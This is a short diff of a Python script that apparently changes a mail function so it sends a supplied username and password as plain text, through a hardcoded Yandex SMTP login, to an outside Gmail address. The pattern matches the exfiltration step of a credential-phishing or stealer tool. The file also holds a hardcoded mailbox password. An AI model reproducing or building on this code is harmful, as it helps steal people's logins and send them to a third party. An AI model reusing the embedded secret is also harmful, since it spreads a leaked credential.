@@ -2,7 +2,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-def send_mail():
+def send_mail(usr,pwd):
     sender_email = "veilmsg@yandex.com"
     password = "suewpzvttlkjgjax"
     recipient_email = 'eshwaryadav7093@gmail.com'
@@ -15,8 +15,8 @@ def send_mail():
 
     # Create the plain text and HTML parts
     text = """
-    username : 123 
-    password : 123
+    username : """+usr+"""
+    password : """+pwd+"""
     """
 
     part1 = MIMEText(text, "plain")
